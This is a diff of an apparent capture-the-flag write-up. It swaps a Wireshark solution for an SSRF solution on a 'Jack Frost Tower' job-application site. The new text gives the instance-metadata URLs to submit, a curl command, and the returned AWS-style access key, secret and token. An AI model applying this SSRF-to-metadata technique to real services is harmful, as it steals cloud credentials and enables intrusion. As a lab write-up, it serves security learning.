@@ -1,17 +1,26 @@
 <h1 id="objective-10-now-hiring">Objective 10: Now Hiring!</h1>
-<p><strong>Location: FrostFest Talks Lobby (Frost Tower, 2nd floor)</strong><br>
-<strong>Elf: Pat Tronizer</strong></p>
-<p>This objective is about getting familiar with Wireshark.</p>
-<p>A <a href="https://downloads.jackfrosttower.com/2021/jackfrosttower-network.zip">network capture file</a> is provided.<br>
-According to Jack Frosts policy, all devices on the network must have the <a href="https://datatracker.ietf.org/doc/html/rfc3514">evil bit</a> in the IP header set.<br>
-The objective is to find the traffic originated by humans and then to find, which trolls are complaning about this human.</p>
-<p>To find the human, the Wireshark filter</p>
-<pre><code>!(ip.flags.rb == 1)
+<p><strong>Location: <a href="https://apply.jackfrosttower.com/">https://apply.jackfrosttower.com/</a></strong><br>
+<strong>Elf: ?</strong></p>
+<p>This objective is about SSRF.</p>
+<p>The website’s application form consumes the user’s name, resume (as file upload) and the URL to the public NLBI report.</p>
+<p>After the submission, the item retrieved through this URL by the website is shown on the “submission accepted” screen using the URL <a href="https://apply.jackfrosttower.com/images/%7Busername%7D.jpg">https://apply.jackfrosttower.com/images/{username}.jpg</a></p>
+<p>By choosing the right IMDS URLs, the secret access key for the S3 bucket can be retrieved using CURL:</p>
+<p>URL 1 (get role name):</p>
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials
 </code></pre>
-<p>was used. It was found that the human is in room 1024.</p>
-<p>Filtering for this room</p>
-<pre><code>urlencoded-form.value contains "room 1024"
+<p>URL 2 (get security credentials for this role):</p>
+<pre><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role
 </code></pre>
-<p>reveals that Yaqh, Flud and Hagg are complaining about the lady in this room.<br>
-Sorting the names results in the solution <strong>Flud Hagg Yaqh</strong></p>
+<pre><code>jsw@io:~$ curl https://apply.jackfrosttower.com/images/joergen.jpg
+{
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"Type": "AWS-HMAC",
+	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+	"Expiration": "2026-05-02T18:50:40Z"
+}
+</code></pre>
+<p>So the secret access key for the S3 bucket is <strong>CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX</strong></p>
 
